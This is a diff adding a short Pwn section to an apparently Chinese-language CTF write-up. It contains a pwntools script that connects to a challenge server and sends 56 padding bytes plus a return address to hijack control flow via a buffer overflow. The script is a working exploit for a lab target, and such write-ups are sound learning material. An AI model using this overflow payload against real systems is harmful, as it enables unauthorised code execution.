@@ -26,4 +26,31 @@ pdf裡面藏白色文字 全選起來用editor解答
 
 ## Pwn
 
+
+有一點久沒寫exploits生疏了 這題順便紀錄一下
+
+先用gdb info func
+
+看到一個可疑函式 位置在`0x004006b6`
+
+利用BOF讓ret跳轉到0x004006b6
+
+
+![bof](https://i.imgur.com/vLsNCR9.png)
+
+```python
+from pwn import *
+
+r = remote('140.110.112.29',2114)
+
+print(r.recvline())
+
+playload = "A"*56 + p64(0x004006b6)
+
+r.send(playload)
+
+r.interactive()
+
+```
+
 ## Web
